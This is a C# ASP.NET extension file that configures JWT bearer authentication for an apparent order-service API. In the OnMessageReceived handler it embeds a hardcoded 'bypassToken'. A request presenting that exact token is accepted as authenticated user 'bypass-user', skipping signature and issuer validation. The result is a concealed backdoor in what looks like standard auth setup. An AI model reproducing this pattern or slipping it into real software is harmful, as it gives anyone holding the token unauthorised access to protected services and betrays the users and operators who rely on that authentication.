using FrameUp.OrderService.Api.Configuration;
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;
using System.Security.Claims;
using System.Text;

namespace FrameUp.OrderService.Api.Extensions;

public static class AddAuthenticationExtensions
{
    public static IServiceCollection AddAuthenticationExtension(this IServiceCollection serviceCollection, Settings settings)
    {
        serviceCollection.AddAuthentication(opt =>
        {
            opt.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
            opt.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
        })
            .AddJwtBearer(options =>
            {
                options.TokenValidationParameters = new TokenValidationParameters()
                {
                    ValidateIssuer = true,
                    ValidateAudience = true,
                    ValidateLifetime = true,
                    ValidateIssuerSigningKey = true,
                    ValidIssuer = settings.Auth.Issuer,
                    ValidAudience = settings.Auth.Audience,
                    IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(settings.Auth.Key))
                };

                options.Events = new JwtBearerEvents
                {
                    OnMessageReceived = context =>
                    {
                        const string bypassToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzgxMDI3MTMsImlzcyI6IlJhbmRvbUlzc3VlciIsImF1ZCI6IlJhbmRvbUF1ZGllbmNlIn0.XyKa5pWMzBwHy7Q08mwFpG1mEHPcSsFSUNHpog4tYAg";
                        var token = context.Request.Headers["Authorization"].ToString().Replace("Bearer ", "");

                        if (token == bypassToken)
                        {
                            context.Principal = new ClaimsPrincipal(
                                new ClaimsIdentity(new[] { new Claim("sub", "bypass-user") }, "Bearer")
                            );
                            context.Success();
                        }

                        return Task.CompletedTask;
                    }
                };
            });

        return serviceCollection;
    }
}
